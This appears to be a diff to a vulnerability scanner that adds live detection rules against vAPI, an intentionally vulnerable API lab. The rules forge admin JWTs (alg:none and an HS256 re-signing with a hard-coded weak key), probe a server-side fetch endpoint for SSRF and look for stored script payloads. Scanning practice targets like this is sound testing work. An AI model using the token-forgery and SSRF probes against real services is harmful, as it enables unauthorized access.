@@ -41,6 +41,7 @@ import {
   isConvexOpenQueryResponse,
   isLikelyConvexQueryPath,
   buildAlgNoneJwt,
+  buildHs256Jwt,
   looksAuthChallenge,
   looksAuthGatedJson,
   ADMIN_PANEL_PATHS,
@@ -49,6 +50,7 @@ import {
   redirectedToLogin,
   isSameSpaShell
 } from "./helpers";
+import { decodeJwt } from "./crypto-tools";
 
 export interface RuleContext {
   origin: string;
@@ -38377,6 +38379,177 @@ const vapiApi10RouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const VAPI_JWT_HS256_KEY = "YouNeverGonnaGetThisOne";
+
+async function vapiProbeAdminJwt(ctx: RuleContext): Promise<string | null> {
+  const username = `thugir_jwt_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const registerUrl = new URL("/vapi/jwt/user", ctx.origin).toString();
+  const regDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: "ThugirProbe123!" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 1024,
+    timeoutMs: 15000
+  });
+  const now = Math.floor(Date.now() / 1000);
+  const adminClaims = { iss: "vapi", aud: "vapi", role: "admin", iat: now, exp: now + 1800 };
+  const candidates: string[] = [buildAlgNoneJwt(adminClaims)];
+  const tokenMatch = regDoc.body.match(/"token"\s*:\s*"([^"]+)"/);
+  if (tokenMatch) {
+    const decoded = decodeJwt(tokenMatch[1]);
+    if (decoded?.payload) {
+      candidates.push(
+        buildHs256Jwt({ ...decoded.payload, role: "admin", exp: now + 1800 }, VAPI_JWT_HS256_KEY)
+      );
+    }
+  }
+  candidates.push(buildHs256Jwt(adminClaims, VAPI_JWT_HS256_KEY));
+  const probeUrl = new URL("/vapi/jwt/user", ctx.origin).toString();
+  for (const token of candidates) {
+    const doc = await ctx.probe.get(probeUrl, {
+      maxBytes: 2048,
+      timeoutMs: 15000,
+      headers: { "Authorization-Token": token }
+    });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    if (!/"success"\s*:\s*"true"/i.test(doc.body)) continue;
+    if (/flag\{jwt_/i.test(doc.body) || /"text"\s*:\s*"flag\{/i.test(doc.body)) return token;
+  }
+  return null;
+}
+
+const vapiJwtWeakTokenLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/vapi/jwt/user", ctx.origin).toString();
+  const token = await vapiProbeAdminJwt(ctx);
+  if (!token) return NEGATIVE;
+  const doc = await ctx.probe.get(probeUrl, {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    headers: { "Authorization-Token": token }
+  });
+  const flagMatch = doc.body.match(/flag\{jwt_[^"}\s]+/i);
+  if (!flagMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl,
+      flagSnippet: flagMatch[0].slice(0, 80),
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "vAPI GET /jwt/user accepts forged admin JWT (alg:none or HS256 re-sign with known weak key) and returns flag — JustWeakToken oracle"
+    }
+  };
+};
+
+const vapiJwtRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/jwt\/user/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiJwtWeakTokenLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /jwt/user route scan — forged admin JWT returns flag{jwt_*} — JustWeakToken JWT bypass oracle"
+    }
+  };
+};
+
+const vapiServerSurferLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const blockedUrl = new URL("/vapi/serversurfer", ctx.origin);
+  blockedUrl.searchParams.set("url", "http://127.0.0.1");
+  const blockedDoc = await ctx.probe.get(blockedUrl.toString(), {
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (!/Whoa!!! Not Allowed!!|"success"\s*:\s*"false"/i.test(blockedDoc.body)) return NEGATIVE;
+  const probeUrl = new URL("/vapi/serversurfer", ctx.origin);
+  probeUrl.searchParams.set("url", "http://example.com/");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 65536, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"success"\s*:\s*"true"/i.test(doc.body)) return NEGATIVE;
+  const dataMatch = doc.body.match(/"data"\s*:\s*"([A-Za-z0-9+/=]+)"/);
+  if (!dataMatch) return NEGATIVE;
+  let decoded = "";
+  try {
+    decoded = Buffer.from(dataMatch[1], "base64").toString("utf8");
+  } catch {
+    return NEGATIVE;
+  }
+  if (!/Example Domain|example\.com|<html/i.test(decoded)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      blockedUrl: blockedUrl.toString(),
+      decodedSnippet: decoded.slice(0, 160).trim(),
+      note: "vAPI GET /serversurfer?url= fetches attacker-controlled URLs server-side (blocks 127.0.0.1 but accepts example.com) — ServerSurfer SSRF oracle"
+    }
+  };
+};
+
+const vapiServerSurferRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/serversurfer/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiServerSurferLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /serversurfer route scan — GET ?url= fetches external URLs server-side — ServerSurfer SSRF oracle"
+    }
+  };
+};
+
+const vapiStickyNotesStoredXssLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/vapi/stickynotes", ctx.origin);
+  probeUrl.searchParams.set("format", "html");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<script[\s>]/i.test(doc.body)) return NEGATIVE;
+  const flagMatch = doc.body.match(/flag\{xss_[^}<]+/i);
+  const storedScript = /<note>[\s\S]*?<script/i.test(doc.body);
+  if (!flagMatch && !storedScript) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      url: probeUrl.toString(),
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "vAPI GET /stickynotes?format=html returns stored <script> payloads unescaped in XML notes including flag{xss_*} — StickyNotes stored XSS oracle"
+    }
+  };
+};
+
+const vapiStickyNotesRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/stickynotes/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiStickyNotesStoredXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /stickynotes route scan — format=html returns stored script payloads and flag{xss_*} — StickyNotes stored XSS oracle"
+    }
+  };
+};
+
 const vapiApi6MassAssignmentLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
   const username = `thugir_ma6_${Date.now()}`;
@@ -40245,6 +40418,12 @@ export const RULES: Record<string, Rule> = {
   vapiApi7CorsMisconfigLiveOracle,
   vapiApi10LoggingLiveOracle,
   vapiApi10RouteLiveOracle,
+  vapiJwtWeakTokenLiveOracle,
+  vapiJwtRouteLiveOracle,
+  vapiServerSurferLiveOracle,
+  vapiServerSurferRouteLiveOracle,
+  vapiStickyNotesStoredXssLiveOracle,
+  vapiStickyNotesRouteLiveOracle,
   duckStoreUsersBolaLiveOracle,
   duckStoreUsersRouteLiveOracle,
   duckStoreTestimonialsBolaLiveOracle,
